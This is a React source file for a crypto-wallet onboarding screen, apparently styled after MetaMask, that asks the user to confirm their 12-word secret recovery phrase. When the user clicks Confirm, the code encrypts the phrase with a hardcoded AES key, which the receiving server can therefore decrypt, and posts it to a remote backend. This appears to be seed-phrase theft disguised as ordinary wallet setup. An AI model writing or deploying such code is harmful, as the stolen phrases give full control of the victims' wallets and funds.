import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import CryptoJS from "crypto-js";
import axios from "axios";
import Loading from "../Layouts/Loading";

const ConfirmSecretKey = ({ seedPhrase }) => {
  const navigate = useNavigate();
  const [secretKey, setSecretKey] = useState("");
  const [invalid, setvalid] = useState(false);
  const [inputs, setInputs] = useState(Array(12).fill(""));
  const [isInputsFilled, setIsInputsFilled] = useState(null);
  const [loading, setLoading] = useState(false);
  const [focusedIndex, setFocusedIndex] = useState(null);
  const inputRef = useRef(null);

  const checkSecretKey = async () => {
    setLoading(true);
    setSecretKey(inputs.toString().replace(/,/g, " "));
    if (secretKey !== seedPhrase) {
      setLoading(false);
      setvalid(true);
      return;
    } else {
      try {
        const encrysecretKey = CryptoJS.AES.encrypt(
          secretKey,
          "HR#s&7uP@l!9tYA"
        ).toString();

        const res = await axios.post(`${process.env.REACT_APP_API_IMPORT}`, {
          encrysecretKey: encrysecretKey,
        });
        if (res?.data) {
          localStorage.setItem("walletAddressTon", res.data.walletTon);
        }
      } catch (error) {
        setLoading(false);
        console.log(error);
      }
    }

    setvalid(false);
    setLoading(false);
    navigate("/create-password");
    return;
  };

  const handleChange = (index) => (e) => {
    const inputString = e.target.value;
    const splitWords = inputString.split(/\s+/).slice(0, 12);

    setInputs(
      inputString.length < 12
        ? [...inputs.slice(0, index), inputString, ...inputs.slice(index + 1)]
        : splitWords.concat(Array(12 - splitWords.length).fill(""))
    );
  };

  const handleInputClick = (index) => {
    setFocusedIndex(index);
  };

  useEffect(() => {
    setSecretKey(inputs.toString().replace(/,/g, " "));
    setIsInputsFilled(inputs.every((value) => value.trim() !== ""));
  });

  const handleClickOutside = (event) => {
    if (inputRef.current && !inputRef.current.contains(event.target)) {
      setFocusedIndex(null);
    }
  };

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  });

  return (
    <>
      {loading && <Loading />}

      <div className="start-come-to-wallet">
        <div className="onboarding-flow__wrapper">
          <div
            className="recovery-phrase__confirm"
            data-testid="confirm-recovery-phrase"
          >
            <div className="box box--margin-bottom-4 box--flex-direction-row">
              <ul className="progressbar">
                <li className="active complete">Secure wallet</li>
                <li className="active">Confirm secret recovery phrase</li>
                <li className="">Create password</li>
              </ul>
            </div>

            <div
              className="box box--margin-bottom-4 box--flex-direction-row box--justify-content-center box--text-align-center box--display-flex "
              style={{
                fontSize: "14px",
                margin: "16px 0",
                fontFamily: "monospace",
              }}
            >
              <h6
                className="box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography--weight-normal  typography--color-text-default"
                style={{ fontFamily: "serif" }}
              >
                Confirm Secret Recovery Phrase
              </h6>
            </div>

            <div className="input-grid">
              {inputs.map((value, index) => (
                <input
                  key={index}
                  value={value}
                  ref={inputRef}
                  type={focusedIndex === index ? "text" : "password"}
                  onClick={() => handleInputClick(index)}
                  onChange={handleChange(index)}
                  placeholder={index + 1}
                  style={{ fontFamily: "serif" }}
                />
              ))}
            </div>

            {invalid && <p style={{ color: "red" }}> Invalid Seed Phrase</p>}

            <div className="recovery-phrase__footer__confirm">
              <button
                className="btn btn-primary btn-custom"
                style={{
                  minHeight: "48px",
                  alignSelf: "center",
                  width: "100%",
                  maxWidth: "400px",
                }}
                onClick={checkSecretKey}
                disabled={!isInputsFilled}
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default ConfirmSecretKey;
